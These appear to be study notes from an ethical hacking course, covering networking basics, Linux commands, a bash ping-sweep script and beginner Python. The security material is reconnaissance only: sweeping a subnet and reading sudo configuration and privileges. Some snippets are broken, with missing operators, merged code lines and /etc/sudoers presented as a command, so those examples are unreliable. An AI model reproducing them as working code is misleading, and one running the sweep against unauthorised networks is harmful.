# Practical Ethical Hacking - The Complete Course

[certificate-of-completion-for-practical-ethical-hacking-the-complete-course.pdf](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/certificate-of-completion-for-practical-ethical-hacking-the-complete-course.pdf)

## Networking Refresher

### IP Addresses

IPv4 (Internet Protocol version 4) and IPv6 (Internet Protocol version 6) are two versions of the Internet Protocol, which is the underlying protocol that enables communication on the internet. They are used to identify and locate devices on a network.

IPv4 addresses are 32-bit numerical addresses represented in a dotted-decimal format, such as "192.168.0.1". Each section, or octet, of the address consists of 8 bits and can range from 0 to 255. This allows for a total of approximately 4.3 billion unique addresses. However, due to the rapid growth of the internet, the number of available IPv4 addresses has become limited, leading to the development of IPv6.

IPv6 addresses are 128-bit addresses represented in a hexadecimal format, such as "2001:0db8:85a3:0000:0000:8a2e:0370:7334". The longer address length of IPv6 allows for a significantly larger number of unique addresses, approximately 3.4×10^38. IPv6 addresses are divided into eight groups of four hexadecimal digits, separated by colons. Leading zeros within a group can be omitted, and consecutive groups of zeros can be represented by a double colon (::) to simplify the address.

The transition from IPv4 to IPv6 is necessary due to the depletion of available IPv4 addresses. IPv6 provides a solution to the address shortage while also introducing improvements in security, auto-configuration, and other features. However, IPv4 and IPv6 are not directly compatible, so various mechanisms and transition technologies exist to enable communication between the two protocols.

In summary, IPv4 and IPv6 are versions of the Internet Protocol that provide unique addresses to devices on a network. IPv4 addresses are 32-bit, while IPv6 addresses are 128-bit. IPv6 offers a larger address space and additional features compared to IPv4.

### MAC Addresses

A MAC (Media Access Control) address is a unique identifier assigned to network interface controllers (NICs) of network devices. It is a hardware address that is permanently assigned by the manufacturer and is stored in the device's firmware or read-only memory (ROM). MAC addresses are used at the data link layer of the OSI model to ensure that data is delivered to the correct device within a local network.

MAC addresses are typically 48 bits in length and are expressed as a sequence of six pairs of hexadecimal digits separated by colons or hyphens. For example, a MAC address may look like "00:1A:2B:3C:4D:5E". The first three pairs of digits identify the manufacturer of the network interface card, while the last three pairs provide a unique identifier for the specific device.

MAC addresses play a crucial role in Ethernet networks, as they allow devices to communicate with each other within a local area network (LAN). When data is sent from one device to another on the same network, it is encapsulated within Ethernet frames that contain the source and destination MAC addresses. Routers and switches use these MAC addresses to forward the data to the appropriate destination.

It's important to note that MAC addresses are specific to the local network and do not have global uniqueness like IP addresses. They are only relevant within the scope of the local network segment. When data needs to be transmitted beyond the local network, it is encapsulated in network packets that contain source and destination IP addresses.

In summary, a MAC address is a unique identifier assigned to the network interface controller of a device. It is used at the data link layer to facilitate communication within a local network. MAC addresses are hardware-based, manufacturer-specific, and differ from IP addresses, which are used for network communication on a larger scale.

### TCP, UDP, and the Three-Way Handshake

TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) are two commonly used transport layer protocols in computer networks.

TCP is a connection-oriented protocol that provides reliable, ordered, and error-checked delivery of data packets over an IP network. It guarantees that data sent from one device is received correctly by the destination device. TCP achieves this reliability through mechanisms like acknowledgement, retransmission, and flow control. It breaks data into smaller packets, assigns sequence numbers to them, and ensures they are reassembled correctly at the receiving end. TCP is widely used for applications that require guaranteed delivery, such as web browsing, email, file transfer, and remote login.

UDP, on the other hand, is a connectionless protocol that does not provide the same level of reliability as TCP. It is simpler and more lightweight, making it suitable for applications that can tolerate some data loss or delay. UDP does not establish a connection or guarantee delivery of packets. It simply sends data packets from one device to another without waiting for acknowledgements or retransmissions. UDP is commonly used for real-time applications like streaming media, online gaming, DNS (Domain Name System), and VoIP (Voice over IP).

The three-way handshake is a process used by TCP to establish a connection between two devices. It is a sequence of three steps that takes place before data transmission can begin. Here's how the three-way handshake works:

1. SYN (Synchronize): The initiating device (often referred to as the client) sends a TCP packet with the SYN flag set to the destination device (often referred to as the server). This packet indicates the desire to establish a connection and includes an initial sequence number.
2. SYN-ACK (Synchronize-Acknowledge): Upon receiving the SYN packet, the destination device responds with a TCP packet that has both the SYN and ACK (acknowledge) flags set. This packet acknowledges the receipt of the initial SYN packet and also includes its own initial sequence number.
3. ACK (Acknowledge): Finally, the initiating device acknowledges the SYN-ACK packet by sending an ACK packet back to the destination. This packet confirms the establishment of the connection and typically contains an incremented sequence number.

Once the three-way handshake is complete, the connection is established, and both devices are ready to exchange data. The sequence numbers exchanged during the handshake are used to ensure that data is transmitted and received in the correct order.

In summary, TCP is a reliable, connection-oriented protocol that guarantees delivery of data, while UDP is a simpler, connectionless protocol that does not provide the same level of reliability. The three-way handshake is a process used by TCP to establish a connection between devices, involving the exchange of SYN, SYN-ACK, and ACK packets.

### Common Ports and Protocols

Here are some commonly used ports and the protocols associated with them in computer networking:

- FTP (File Transfer Protocol): Port 21 (TCP)
- SSH (Secure Shell): Port 22 (TCP)
- Telnet: Port 23 (TCP)
- SMTP (Simple Mail Transfer Protocol): Port 25 (TCP)
- DNS (Domain Name System): Port 53 (TCP and UDP)
- HTTP (Hypertext Transfer Protocol): Port 80 (TCP)
- HTTPS (Hypertext Transfer Protocol Secure): Port 443 (TCP)
- DHCP (Dynamic Host Configuration Protocol): Port 67 (UDP) and Port 68 (UDP)
- POP3 (Post Office Protocol version 3): Port 110 (TCP)
- IMAP (Internet Message Access Protocol): Port 143 (TCP)
- SNMP (Simple Network Management Protocol): Port 161 (UDP)
- RDP (Remote Desktop Protocol): Port 3389 (TCP)
- NTP (Network Time Protocol): Port 123 (UDP)
- SMB (Server Message Block): Port 445 (TCP)
- FTPS (FTP over SSL/TLS): Port 990 (TCP)
- TFTP (Trivial File Transfer Protocol): Port 69 (UDP)
- LDAP (Lightweight Directory Access Protocol): Port 389 (TCP and UDP)
- MySQL: Port 3306 (TCP)
- RDP (Remote Desktop Protocol): Port 3389 (TCP)

Please note that some protocols use both TCP and UDP, depending on the specific functionality and requirements. Additionally, these port assignments are not exhaustive, and other applications and services may use different ports as well.

### The OSI Model

The OSI (Open Systems Interconnection) model is a conceptual framework that standardizes the functions of a communication system into seven distinct layers. Each layer has specific responsibilities and interacts with the layers above and below it. The OSI model provides a structured approach to understanding and designing network protocols and communication systems. Here's a brief overview of each layer:

1. Physical Layer: The physical layer is responsible for the transmission and reception of raw unstructured data bits over a physical medium. It defines the electrical, mechanical, and functional characteristics of the physical interface between devices.
2. Data Link Layer: The data link layer handles the reliable transmission of data frames between directly connected nodes over a physical link. It provides error detection and correction, flow control, and handles access to the physical medium. Ethernet, Wi-Fi, and PPP (Point-to-Point Protocol) are examples of data link layer protocols.
3. Network Layer: The network layer enables the routing of data packets across different networks. It deals with logical addressing and determines the best path for data delivery based on network conditions and routing protocols. The IP (Internet Protocol) is a key network layer protocol.
4. Transport Layer: The transport layer ensures the reliable and orderly delivery of data between end systems. It breaks data into smaller segments, manages end-to-end communication, and provides error recovery, flow control, and congestion control. TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) operate at this layer.
5. Session Layer: The session layer establishes, manages, and terminates communication sessions between applications. It provides synchronization and dialog control mechanisms to enable seamless communication between devices. This layer also handles session checkpointing and recovery.
6. Presentation Layer: The presentation layer is responsible for data representation, encryption, compression, and formatting. It ensures that data sent by the application layer of one system is understandable by the application layer of another system. This layer deals with data syntax and semantics.
7. Application Layer: The application layer is the closest layer to the end-user and provides services directly to user applications. It includes protocols for various application-level services such as file transfer, email, web browsing, and remote access. Examples of protocols at this layer include HTTP, SMTP, FTP, and DNS.

The key idea behind the OSI model is to separate the complex task of network communication into manageable layers, with each layer focused on specific functions. This modular approach facilitates interoperability, ease of implementation, and troubleshooting in network systems.

It's important to note that the OSI model is a conceptual model and does not necessarily reflect the exact implementation of all networking systems, which often use a hybrid of various layers and protocols. However, the OSI model remains a useful reference for understanding network communication and protocols.

### Subnetting Part

Resources for this video:

Seven Second Subnetting: [https://www.youtube.com/watch?v=ZxAwQB8TZsM](https://www.youtube.com/watch?v=ZxAwQB8TZsM)

Subnet Guide: [https://drive.google.com/file/d/1ETKH31-E7G-7ntEOlWGZcDZWuukmeHFe/view](https://drive.google.com/file/d/1ETKH31-E7G-7ntEOlWGZcDZWuukmeHFe/view)

Subnetting is the process of dividing a network into smaller subnetworks called subnets. It allows for more efficient use of IP addresses and facilitates network management and routing. Subnetting is commonly used in IPv4 networks.

Subnetting involves borrowing bits from the host portion of an IP address to create a subnet identifier. By doing this, a network can be divided into multiple subnets, each with its own range of IP addresses.

CIDR (Classless Inter-Domain Routing) notation is a method used to represent IP addresses and their corresponding subnet masks. It specifies the network prefix length, which indicates the number of bits used for the network portion of the IP address. CIDR notation is expressed by appending a forward slash (/) followed by the prefix length to the IP address.

Here's an example to illustrate subnetting and CIDR notation:

Consider an IP address: 192.168.0.0/24

In this example, the IP address is in the format of "192.168.0.0" and the "/24" represents the prefix length, indicating that the first 24 bits represent the network portion of the IP address, while the remaining 8 bits represent the host portion.

With a /24 prefix length, the subnet mask for this network would be 255.255.255.0. This means that the first three octets are reserved for the network, and the last octet can be used for addressing hosts within the subnet.

To subnet this network further, additional bits can be borrowed from the host portion. For instance, if we borrow 2 bits, we can create 4 subnets. The subnet mask would become 255.255.255.192 (in binary: 11111111.11111111.11111111.11000000).

The four resulting subnets would be:

1. Subnet 1: 192.168.0.0/26 (network range: 192.168.0.0 - 192.168.0.63)
2. Subnet 2: 192.168.0.64/26 (network range: 192.168.0.64 - 192.168.0.127)
3. Subnet 3: 192.168.0.128/26 (network range: 192.168.0.128 - 192.168.0.191)
4. Subnet 4: 192.168.0.192/26 (network range: 192.168.0.192 - 192.168.0.255)

Each subnet can then be assigned to a different segment or used for different purposes within the network.

CIDR notation provides a concise way to represent networks and subnets by specifying the prefix length. It allows for flexibility in defining network boundaries and enables efficient address allocation in IP networking.

## **Setting Up Our Lab**

[](https://academy.tcm-sec.com/courses/practical-ethical-hacking-the-complete-course/lectures/24747409)Installing VMWare / VirtualBox

Configuring VirtualBox

Installing Kali Linux

## **Introduction to Linux**

### [](https://academy.tcm-sec.com/courses/practical-ethical-hacking-the-complete-course/lectures/24747390)Exploring Kali Linux

Kali Linux is a specialized Linux distribution designed for digital forensics, penetration testing, and ethical hacking purposes. It is a powerful and widely used operating system used by cybersecurity professionals, researchers, and enthusiasts.

Kali Linux is based on Debian Linux. It provides a comprehensive set of pre-installed tools and software packages specifically tailored for various security testing and hacking purposes.

The main goal of Kali Linux is to provide a robust and all-in-one platform for performing security assessments, vulnerability analysis, network scanning, password cracking, wireless security testing, and much more. It includes tools for web application testing, reverse engineering, exploit development, and secure communication as well.

Kali Linux is designed with security in mind and comes with features like full disk encryption, secure shell access, and regular updates to ensure a secure and up-to-date environment for its users.

While Kali Linux is a powerful tool for security professionals, it is important to use it responsibly and within legal boundaries. Ethical hacking and security testing should always be performed with proper authorization and adherence to applicable laws and regulations.

### Sudo Overview

The `sudo` command in Linux allows a user with appropriate privileges to execute commands as a superuser or another user. It is commonly used to perform administrative tasks that require elevated privileges. Here's an example of how `sudo` is used:

Let's say you want to install a software package using the `apt` package manager, but it requires administrative privileges. You can use `sudo` to execute the `apt` command with elevated privileges. Here's the command:

```
sudo apt install <package_name>

```

For instance, if you want to install the package named "nginx" on an Ubuntu system, you can use the following command:

```
sudo apt install nginx

```

After running this command, you will be prompted to enter your password. Once you provide the correct password, the command will be executed with superuser privileges, allowing you to install the "nginx" package on the system.

Please note that the availability and configuration of `sudo` can vary depending on the Linux distribution and the user's privileges. Additionally, the `sudo` command can be used for various other administrative tasks, such as editing system files, managing services, and executing critical commands.

### [](https://academy.tcm-sec.com/courses/practical-ethical-hacking-the-complete-course/lectures/24747379)Navigating the File System

Here are explanations and examples of the commands mentioned in this video:

`pwd` (Print Working Directory):

- Explanation: Displays the current working directory.Example: Running `pwd` in the terminal would show the absolute path of the current directory, such as "/home/user/documents".

`cd` (Change Directory):

- Explanation: Allows you to change the current working directory.Example: Running `cd /home/user/documents` would change the directory to "/home/user/documents".

`cd ..` (Change to Parent Directory):

- Explanation: Moves up one level in the directory hierarchy.Example: Running `cd ..` in "/home/user/documents" would move to the "/home/user" directory.

`ls` (List Directory Contents):

- Explanation: Lists the files and directories in the current directory.Example: Running `ls` would display the files and directories in the current directory.

`ls -la` (List Detailed Directory Contents):

- Explanation: Lists detailed information about files and directories, including hidden files.Example: Running `ls -la` would display a detailed list of files and directories, including hidden files, in the current directory.

`mkdir` (Make Directory):

- Explanation: Creates a new directory.Example: Running `mkdir new_folder` would create a new directory named "new_folder" in the current directory.

`rmdir` (Remove Directory):

- Explanation: Removes an empty directory.Example: Running `rmdir empty_folder` would remove the directory named "empty_folder" if it is empty.

`man` (Manual):

- Explanation: Displays the manual pages for a specified command.Example: Running `man ls` would show the manual pages with detailed information about the `ls` command.

`echo`:

- Explanation: Displays text or variables as output.Example: Running `echo "Hello, world!"` would output "Hello, world!" in the terminal.

`>` (Output Redirection):

- Explanation: Redirects the output of a command to a file and overwrites the file if it already exists.Example: Running `echo "Hello" > greeting.txt` would write the text "Hello" to a file named "greeting.txt" or overwrite the file if it exists.

`>>` (Append Output):

- Explanation: Redirects the output of a command and appends it to a file.Example: Running `echo "World!" >> greeting.txt` would append the text "World!" to the end of the "greeting.txt" file.

`rm` (Remove):

- Explanation: Deletes files or directories.Example: Running `rm file.txt` would delete the file named "file.txt" from the current directory.

`mv` (Move):

- Explanation: Moves or renames files and directories.Example: Running `mv file.txt new_directory/file_renamed.txt` would move the file "file.txt" to the "new_directory" and rename it as "file_renamed.txt".

`cp` (Copy):

- Explanation: Copies files and directories.Example: Running `cp file.txt backup/file_copy.txt` would create a copy of "file.txt" named "file_copy.txt" in the "backup" directory.

`locate`:

- Explanation: Searches for files and directories in a prebuilt database.Example: Running `locate myfile.txt` would search for the file named "myfile.txt" in the prebuilt database and display its path if found.

`updatedb`:

- Explanation: Updates the database used by the `locate` command to reflect recent changes in the file system.Example: Running `updatedb` would update the database, allowing the `locate` command to provide up-to-date search results.

`passwd`:

- Explanation: Allows a user to change their password.Example: Running `passwd` would prompt the user to enter their current password and then set a new password.

Remember to exercise caution when using commands like `rm` as they can permanently delete files. It's always a good practice to double-check before executing such commands.

### Users and Privileges

In the `ls -la` output, the "rwx" refers to the permissions associated with a file or directory. The permissions are displayed for three different entities: the owner, the group, and other users. Each entity has three permission categories: read (r), write (w), and execute (x). Here's a breakdown of what each permission category represents:

- Read (r): Allows the entity to read or view the contents of a file or the names of files within a directory.
- Write (w): Enables the entity to modify or write to a file or add, delete, or rename files within a directory.
- Execute (x): Grants the entity the permission to execute a file or enter a directory. For directories, execute permission is required to access its contents.

In the `ls -la` output, the permissions are displayed as a series of nine characters. The first character represents the file type (e.g., `-` for a regular file, `d` for a directory). The next three characters represent the owner's permissions, followed by the group's permissions, and then the permissions for other users.

For example, let's consider an `ls -la` output line:

```
-rwxr-x--- 1 user group 4096 May 10 12:34 myfile.txt

```

In this example, the permissions are broken down as follows:

- `rwxr-x---`: The first character indicates that it is a regular file. The following three characters (`rwx`) represent the owner's permissions (read, write, and execute). The next three characters (`r-x`) represent the group's permissions (read and execute). The last three characters (`--`) represent the permissions for other users (no permissions).
- `1`: Indicates the number of hard links to the file.
- `user`: Refers to the owner of the file.
- `group`: Refers to the group assigned to the file.
- `4096`: Indicates the file size in bytes.
- `May 10 12:34`: Specifies the date and time of the last modification.
- `myfile.txt`: Represents the name of the file.

It's worth noting that if a permission is not granted for a particular entity, a hyphen (`-`) is displayed in its place. Additionally, the output can include additional information such as special permissions, ownership, and timestamps.

Here are explanations and examples of the commands mentioned in this video. Please note, Teachable blocks the mention of some of the sensitive paths shown in the video, so we cannot display them in text format here:

`chmod` (Change Mode):

- Explanation: Changes the permissions of a file or directory.Example: Running `chmod +x script.sh` would add the execute permission to the file "script.sh", allowing it to be executed as a script.

`adduser`:

- Explanation: Creates a new user account.Example: Running `adduser john` would create a new user account with the username "john" and prompt for additional user information.

`su` (Switch User):

- Explanation: Allows a user to switch to another user account.Example: Running `su jane` would switch to the user account "jane" after entering the password for that account.

`/etc/sudoers`:

- Explanation: Displays the content of the "/etc/sudoers" file, which contains configuration information for the `sudo` command.Example: Running `/etc/sudoers` would display the configuration directives for `sudo` access and permissions.

`sudo -l`:

- Explanation: Lists the commands a user is allowed to run with `sudo` privileges.Example: Running `sudo -l` would display the commands and permissions available to the current user with `sudo` access.

Please note that some of these commands require administrative privileges, and caution should be exercised when modifying system files or working with user accounts.

### Common Network Commands

Here are explanations and examples of the commands mentioned in this video:

`ip a`:

- Explanation: Displays the network interfaces and their associated IP addresses.Example: Running `ip a` would show information about network interfaces, including their IP addresses, MAC addresses, and other details.

`ifconfig`:

- Explanation: Displays the configuration and status of network interfaces.Example: Running `ifconfig` would show the configuration details, including IP addresses, MAC addresses, and other information for active network interfaces.

`iwconfig`:

- Explanation: Displays the configuration and status of wireless network interfaces.Example: Running `iwconfig` would show the configuration details, such as wireless signal strength, frequency, and encryption information, for active wireless interfaces.

`ip n`:

- Explanation: Displays the Neighbor Table, which contains the IP-to-MAC address mappings for devices in the local network.Example: Running `ip n` would show the IP and MAC addresses of devices that have recently communicated with the current device.

`arp -a`:

- Explanation: Displays the ARP (Address Resolution Protocol) cache, which maps IP addresses to MAC addresses.Example: Running `arp -a` would show the IP and MAC addresses of devices that have been resolved recently by the ARP protocol.

`ip r`:

- Explanation: Displays the routing table, which contains information about network routes.Example: Running `ip r` would show the routing table, including destination networks, gateway IP addresses, and network interfaces.

`route`:

- Explanation: Displays or manipulates the IP routing table.Example: Running `route` would display the routing table, similar to the `ip r` command.

`ping`:

- Explanation: Sends ICMP echo requests to a specified IP address to check network connectivity and measure round-trip time.Example: Running `ping 8.8.8.8` would send ICMP echo requests to the IP address "8.8.8.8" (Google's DNS server) and display the round-trip time and packet loss statistics.

These commands are commonly used for network troubleshooting, configuration, and gathering network-related information in Linux systems.

### Viewing, Creating, and Editing Files

Here are explanations and examples of the commands mentioned in this video:

`echo "hello" > hey.txt`:

- Explanation: Creates a new file named "hey.txt" with the content "hello" and overwrites the file if it already exists.Example: Running `echo "hello" > hey.txt` would create a file named "hey.txt" and write the word "hello" into it.

`echo "hello again" >> hey.txt`:

- Explanation: Appends the content "hello again" to an existing file named "hey.txt" or creates a new file if it doesn't exist.Example: Running `echo "hello again" >> hey.txt` would append the text "hello again" to the end of the "hey.txt" file.

`touch newfile.txt`:

- Explanation: Creates a new empty file named "newfile.txt" or updates the timestamp of an existing file to the current time.Example: Running `touch newfile.txt` would create an empty file named "newfile.txt" if it doesn't exist or update its timestamp if it already exists.

`nano newfile.txt`:

- Explanation: Opens the text editor Nano and allows you to create or edit the content of a file named "newfile.txt".Example: Running `nano newfile.txt` would open the Nano editor, where you can enter or modify text in the "newfile.txt" file.

`mousepad newfile.txt`:

- Explanation: Opens the Mousepad text editor and allows you to create or edit the content of a file named "newfile.txt".Example: Running `mousepad newfile.txt` would open the Mousepad editor, where you can enter or modify text in the "newfile.txt" file.

These commands are commonly used for file manipulation and editing in Linux systems. The `echo` command is used to print text or variables to the terminal or redirect them to files. The `touch` command is used to create or update file timestamps. The `nano` and `mousepad` commands are text editors that allow you to create and modify files directly from the terminal.

### Starting and Stopping Services

Here are explanations and examples of the commands mentioned in this video:

`sudo service apache2 start`:

- Explanation: Starts the Apache web server service.Example: Running `sudo service apache2 start` would initiate the Apache web server and make it available for serving web pages.

`sudo service apache2 stop`:

- Explanation: Stops the Apache web server service.Example: Running `sudo service apache2 stop` would halt the running Apache web server, shutting down any active web page serving.

`python3 -m http.server 80`:

- Explanation: Starts a simple HTTP server using Python on port 80.Example: Running `python3 -m http.server 80` would start a basic HTTP server on port 80, allowing you to serve files from the current directory.

`sudo systemctl enable ssh`:

- Explanation: Enables the SSH (Secure Shell) service to start automatically on system boot.Example: Running `sudo systemctl enable ssh` would configure the system to start the SSH service during system startup.

`sudo systemctl disable ssh`:

- Explanation: Disables the SSH service from starting automatically on system boot.Example: Running `sudo systemctl disable ssh` would prevent the SSH service from starting automatically during system startup.

These commands are frequently used in Linux systems for managing services, starting and stopping processes, and enabling or disabling specific services at system startup. The `sudo` command is used to execute commands with superuser privileges. The `service` and `systemctl` commands are used to manage system services.

### Installing and Updating Tools

Here are explanations and examples of the commands mentioned in this video:

`sudo apt update && sudo apt upgrade`:

- Explanation: Updates the package lists and upgrades installed packages on a Debian-based Linux system using the APT package manager.Example: Running `sudo apt update && sudo apt upgrade` would update the package lists to retrieve information about available updates, and then upgrade the installed packages to their latest versions.

`sudo apt install cron-daemon-common`:

- Explanation: Installs the "cron-daemon-common" package using APT. Cron is a time-based job scheduler in Linux systems, and the "cron-daemon-common" package provides common files and utilities for the cron daemon.Example: Running `sudo apt install cron-daemon-common` would download and install the "cron-daemon-common" package on the system.

`sudo git clone [https://github.com/Dewalt-arch/pimpmykali.git](https://github.com/Dewalt-arch/pimpmykali.git)`:

- Explanation: Clones a Git repository from the specified URL using the Git version control system.Example: Running `sudo git clone [https://github.com/Dewalt-arch/pimpmykali.git](https://github.com/Dewalt-arch/pimpmykali.git)` would clone the repository from the given URL and create a local copy of the repository's files and version history.

These commands are commonly used in Linux systems for updating packages, installing new software, and managing version-controlled repositories. The `sudo` command is used to execute commands with superuser privileges. The `apt` command is used for package management in Debian-based distributions. The `git` command is used for version control and working with Git repositories.

### Scripting with Bash

TEXT

```bash
#!/bin/bash
if [ "$1" == "" ]
then
echo "You forgot an IP address!"
echo "Syntax: ./ipsweep.sh 192.168.1"

else
for ip in `seq 1 254`; do
ping -c 1 $1.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &
done
fi
```

Frequently Asked Questions:

**Question**: My bash script is producing an error with “seq”. How do I resolve?

**Resolution**: Ensure use of backtick (`) instead of using single quote ('). Alternatively, use $(seq 1 254) instead of seq

## Introduction to Python

### Strings

In Python, the `str` (string) data type represents a sequence of characters enclosed within single quotes (' ') or double quotes (" "). Strings in Python are immutable, which means they cannot be changed after they are created. Here are some key points about strings in Python:

Creation:

- Example: `my_string = 'Hello, World!'` or `my_string = "Hello, World!"`

Accessing Characters:

- You can access individual characters within a string using indexing, starting from 0.Example: `print(my_string[0])` would output 'H'.

String Concatenation:

- You can concatenate (join) two or more strings using the `+` operator.Example: `greeting = 'Hello' + ' ' + 'World!'` would result in 'Hello World!'.

String Length:

- The `len()` function can be used to determine the length (number of characters) of a string.Example: `print(len(my_string))` would output the length of the string.

String Slicing:

- You can extract a substring from a string using slicing, specifying the start and end indices.Example: `substring = my_string[7:12]` would extract the substring 'World'.

String Methods:

- Python provides various built-in methods to manipulate and transform strings. Examples include `upper()`, `lower()`, `strip()`, `split()`, `replace()`, and more.Example: `print(my_string.upper())` would output 'HELLO, WORLD!'.

String Formatting:

- String formatting allows you to embed values within a string. This can be done using the `%` operator or the `format()` method.
- Example:

```
name = 'Alice'
age = 30
print("My name is %s and I'm %d years old." % (name, age))
# Output: My name is Alice and I'm 30 years old.

```

These are just a few key concepts related to strings in Python. Strings in Python are versatile and support a wide range of operations and manipulations.

PYTHON

```
#Print string
print("Hello, world!")
print('Hello, world!')
print("""This string runs
multiple lines!""")
print("This string is "+"awesome!")#we can also concatenate
print('\n')#new line
print('Test that new line out.')
```

### Math

In Python, the `math` module is a built-in module that provides various mathematical functions and constants. It allows you to perform advanced mathematical operations in your Python programs. To use the `math` module, you need to import it first using the `import` statement. Here's an overview of some commonly used math functions and operators in Python:

Math Functions in the `math` Module:

- `math.sqrt(x)`: Calculates the square root of `x`.
- `math.pow(x, y)`: Raises `x` to the power of `y`.
- `math.exp(x)`: Calculates the exponential value of `x` (e^x).
- `math.log(x)`: Calculates the natural logarithm of `x` (base e).
- `math.log10(x)`: Calculates the logarithm of `x` to base 10.
- `math.sin(x)`, `math.cos(x)`, `math.tan(x)`: Calculate the sine, cosine, and tangent of `x`, respectively (where `x` is in radians).
- `math.degrees(x)`: Converts `x` from radians to degrees.
- `math.radians(x)`: Converts `x` from degrees to radians.

Math Operators:

- Addition (`+`): Adds two numbers.
- Subtraction (``): Subtracts one number from another.
- Multiplication (``): Multiplies two numbers.
- Division (`/`): Divides one number by another.
- Integer Division (`//`): Performs division and returns the quotient as an integer (rounds down).
- Modulo (`%`): Returns the remainder of division.
- Exponentiation (`*`): Raises a number to a power.

Example usage:

```
import math
# Using math functions
print(math.sqrt(25)) # Output: 5.0
print(math.pow(2, 3)) # Output: 8.0
print(math.sin(math.pi/2)) # Output: 1.0

# Using math operators
x = 10 y = 3 print(x + y) # Output: 13
print(x / y) # Output: 3.3333333333333335
print(x // y) # Output: 3
print(x % y) # Output: 1
print(x ** y) # Output: 1000

```

These are just a few examples of the mathematical functions and operators available in Python. The `math` module provides many more functions and constants that you can explore in the Python documentation.

PYTHON

```
#Math
print(50 + 50)#add
print(50 - 50)#subtract
print(50 * 50)#multiply
print(50 / 50)#divide
print(50 + 50 - 50 * 50 / 50)#PEMDAS
print(50 ** 2)#exponents
print(50 % 6)#modulo - takes what is left over
print(50 / 6)#division with decimals
print(50 // 6)#no remainder
```

### Variables and Methods

In Python, variables and methods are fundamental concepts used in programming. Here's an explanation of each:

Variables:

A variable is a named storage location used to store data or values in a program. It acts as a placeholder for data that can be accessed, modified, or used in calculations throughout the program. Variables in Python are dynamically typed, meaning their data type can change during program execution. Here's an example of variable usage in Python:

```
# Variable assignment
x = 10
name = "John"
is_true = True

# Variable usage
y = x + 5
print("Hello, " + name)
if is_true:
    print("The condition is true")

```

In the example above, `x`, `name`, and `is_true` are variables assigned with different data types (integer, string, and boolean, respectively). They are used in calculations and print statements to perform operations and display values.

Methods:

A method is a block of reusable code that performs a specific task or action. Methods are associated with objects or classes and are called upon to perform certain operations. In Python, methods are commonly referred to as functions. Built-in functions and user-defined functions both fall under the category of methods. Here's an example:

```
# Built-in method example
numbers = [1, 2, 3, 4, 5]
length = len(numbers)
print("Length:", length)

# User-defined method example
def greet(name):
    print("Hello, " + name)

greet("Alice")

```

In the example above, `len()` is a built-in method that calculates the length of a list (`numbers` in this case). The user-defined method `greet()` takes a parameter `name` and prints a greeting message. It is called with the argument "Alice" to print "Hello, Alice" to the console.

Methods can have return values, perform actions, accept parameters, and more, depending on their purpose and design.

Variables and methods are essential components in Python programming. Variables store data, while methods encapsulate reusable blocks of code for specific tasks. Understanding their usage and relationship is crucial for building functional and efficient programs.

PYTHON

```
#Variables and Methods
quote = "All is fair in love and war."
print(quote)

print(quote.upper())#uppercase
print(quote.lower())#lowercase
print(quote.title())#title case
print(len(quote))#counts characters

name = "Heath"#string
age = 33#int
gpa = 3.7#float - has a decimal

print(int(age))
print(int(30.1))
print(int(30.9)) - Will it round? No!

print("My name is " + name + " and I am " + str(age) + " years old.")

age +=1
print(age)

birthday = 1
age += birthday
print(age)
```

### Functions

In Python, a function is a reusable block of code that performs a specific task. Functions allow you to organize code into logical and modular units, making your code more readable, maintainable, and reusable. Here's an explanation of functions in Python:

Function Definition:

A function is defined using the `def` keyword, followed by the function name, parentheses, and a colon. The function may also have parameters (optional) and a return statement (optional) to send back a result. Here's an example of a simple function definition:

```
def greet():
    print("Hello, World!")

```

Function Call:

To execute a function, you need to call it by its name, followed by parentheses. Here's an example of calling the `greet()` function:

```
greet()

```

Function Parameters:

Functions can accept parameters, which are variables that hold values passed to the function when it is called. Parameters allow you to customize the behavior of a function based on the values you provide. Here's an example of a function with parameters:

```
def greet(name):
    print("Hello, " + name + "!")

greet("Alice")

```

In the example above, the `greet()` function accepts a parameter named `name`. When the function is called with an argument, such as "Alice", the value is assigned to the `name` parameter within the function body.

Return Statement:

Functions can also return values using the `return` statement. The returned value can be assigned to a variable or used directly in expressions. Here's an example:

```
def add_numbers(a, b):
    return a + b

result = add_numbers(3, 4)
print(result)  # Output: 7

```

In this example, the `add_numbers()` function takes two parameters (`a` and `b`) and returns their sum. The returned value is then assigned to the `result` variable and printed.

Functions provide a way to encapsulate reusable code and improve the structure of your programs. They can take inputs, perform computations, and produce outputs, allowing you to modularize your code and make it more efficient and maintainable.

PYTHON

```
#Functions
print("Here is an example function:")

def who_am_i():#this is a function without parameters
	name = "Heath"
	age = 30#local variable
	print("My name is " + name + " and I am " + str(age) + " years old.")

who_am_i()

#adding parametersdef add_one_hundred(num):
	print(num + 100)

add_one_hundred(100)

#multiple parametersdef add(x,y):
	print(x + y)

add(7,7)

def multiply(x,y):
	return x * y

multiply(7,7)
print(multiply(7,7))

def square_root(x):
	print(x ** .5)

square_root(64)

def nl():
	print('\n')

nl()
```

### Boolean Expressions and Relational Operators

In Python, boolean expressions are expressions that evaluate to either `True` or `False`. They are typically used in conditional statements and logical operations to make decisions based on the truth or falsity of certain conditions. Relational operators are used to compare values and create boolean expressions. Here's an explanation of boolean expressions and relational operators in Python:

Relational Operators:

Python provides several relational operators to compare values. Here are the commonly used relational operators:

- Equality (`==`): Checks if two values are equal.
- Inequality (`!=`): Checks if two values are not equal.
- Greater than (`>`): Checks if the left value is greater than the right value.
- Less than (`<`): Checks if the left value is less than the right value.
- Greater than or equal to (`>=`): Checks if the left value is greater than or equal to the right value.
- Less than or equal to (`<=`): Checks if the left value is less than or equal to the right value.

Boolean Expressions:

Boolean expressions are formed by combining relational expressions using logical operators. The logical operators in Python are:

- Logical AND (`and`): Returns `True` if both operands are `True`.
- Logical OR (`or`): Returns `True` if at least one operand is `True`.
- Logical NOT (`not`): Negates the value of the operand.

Examples:

```
x = 5
y = 10

# Relational operators
print(x == y)   # Output: False
print(x < y)    # Output: True

# Boolean expressions
print(x < y and y > 0)    # Output: True
print(x < y or y < 0)     # Output: True
print(not (x == y))       # Output: True

```

In the example above, we have two variables `x` and `y`. We use the relational operators (`==` and `<`) to compare their values and create boolean expressions. The logical operators (`and`, `or`, and `not`) are then used to combine the relational expressions and evaluate the overall truth value.

